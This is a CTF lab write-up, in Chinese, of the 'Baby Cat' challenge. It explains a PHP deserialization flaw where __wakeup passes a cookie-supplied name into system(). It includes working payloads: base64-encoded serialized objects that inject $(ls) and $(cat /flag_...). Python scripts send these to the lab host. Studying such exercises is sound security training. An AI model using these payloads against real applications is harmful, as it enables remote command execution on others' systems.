# lab_Baby_Cat

1. 這題進入網站之後，直接點進 Source Code 去看他的程式，然後我對這個程式的理解是，如果網址中有 'source' 參數，則顯示原始碼並停止程式（使用 **`show_source`** 和 **`die`** ），它定義了一個名為 Cat 的類別。Cat 類別有一個名為 $name 的 Public variable，預設值為 '(guest cat)'。Cat 類別有一個名為 __construct 的建構函式，當建立一個新的 Cat 物件時會執行，並將參數 $name 值給 $name 變數，Cat 類別還有一個名為 __wakeup 的函式，當 Cat 物件被反序列化（unserialize）時會執行。它會使用 cowsay 命令顯示一個訊息，內容為 "Welcome back, $this->name"。然後，如果 cookie 中沒有 cat_session，則建立一個新的 Cat 物件，並將它序列化（serialize）後加密（base64_encode）後儲存在 cookie 中。如果 cookie 中有 cat_session，則將 cookie 中的值反序列化（base64_decode、unserialize）後儲存在變數 $cat 中。最後，會顯示一個字串 "Hello, $cat->name."，就是一開始網站連進來的地方，
並提供一個連結可以查看原始碼。

![截圖 2023-01-05 上午10.24.44.png](lab_Baby_Cat%20ef0e7bc5c3894586ad89d5fdf21ac7f5/%25E6%2588%25AA%25E5%259C%2596_2023-01-05_%25E4%25B8%258A%25E5%258D%258810.24.44.png)

![截圖 2023-01-05 上午10.16.57.png](lab_Baby_Cat%20ef0e7bc5c3894586ad89d5fdf21ac7f5/%25E6%2588%25AA%25E5%259C%2596_2023-01-05_%25E4%25B8%258A%25E5%258D%258810.16.57.png)

1. 首先我們我們在 Cat 物件建立時，給 $name 參數，讓它放進 $this→name，這個時候執行 Cat 物件，他會去呼叫 __Wakeup 函數，Welcome Back 之後就會執行你給他的值 $this→name，如果我們這邊執行 $name 的值設定為 $(ls) 他就可以去執行 system("cowsay 'Welcome back, $(ls)'")。
    
    ```php
    $cat = new Cat("' $(ls) '");
    ```
    

1. 然後如果 Cookie 是空的，他會建立一個新的 cat 物件，但 $this→name 會是空的，如果 Cookie 是我們設定的值，他就會將取得的值反序列化後存在 $Cat ，然後會在 `<p>Hello, <?= $cat->name ?>.</p>`的時候執行它，因為他會將 Unserialize(Base64_Decode(Cat_Session))) 先 Decode 在反序列化，所以我們需要將 (Base64_Encode(Serialize(Cat_Session))) 先 序列化再 Encode 並設在 Cookie 裡，就可以透過 cat_session 把值給 $cat。
    
    ```php
    #In PHP
    $cat = new Cat("' $(ls) '");
    echo base64_encode(serialize($cat));
    ```
    
2. 然後將序列化根 base64_encode 過後的 cat 設為 cookie ，再對網站發出 Request，就成功執行自己的指令了，基本上到這邊就已經可以執行任意指令。

```python
import requests

# ' $(ls ) '
cookies={"cat_session": "TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czo5OiInICQobHMpICciO30="}

r = requests.get("http://h4ck3r.quest:8601/", cookies=cookies)
string = r.content.split(b'\n')
[print(string[i]) for i in range(len(string))]
```

![截圖 2023-01-05 上午11.01.47.png](lab_Baby_Cat%20ef0e7bc5c3894586ad89d5fdf21ac7f5/%25E6%2588%25AA%25E5%259C%2596_2023-01-05_%25E4%25B8%258A%25E5%258D%258811.01.47.png)

1. 翻了一下，在根目錄有個 flag_5fb2acebf1d0c558 檔案，用 cat 將它開啟後。就可以成功取得 FLAG。

```python
import requests

# ' $(ls ) '
#cookies={"cat_session": "TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czo5OiInICQobHMpICciO30="}
# ' $(ls /) '
#cookies={"cat_session": "TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czoxMToiJyAkKGxzIC8pICciO30="}

# ' $(cat /flag_5fb2acebf1d0c558) '
cookies={"cat_session": "TzozOiJDYXQiOjE6e3M6NDoibmFtZSI7czozMzoiJyAkKGNhdCAvZmxhZ181ZmIyYWNlYmYxZDBjNTU4KSAnIjt9"}

r = requests.get("http://h4ck3r.quest:8601/", cookies=cookies)
#print(r.content)
string = r.content.split(b'\n')
[print(string[i]) for i in range(len(string))]
```

![截圖 2023-01-05 上午11.04.05.png](lab_Baby_Cat%20ef0e7bc5c3894586ad89d5fdf21ac7f5/%25E6%2588%25AA%25E5%259C%2596_2023-01-05_%25E4%25B8%258A%25E5%258D%258811.04.05.png)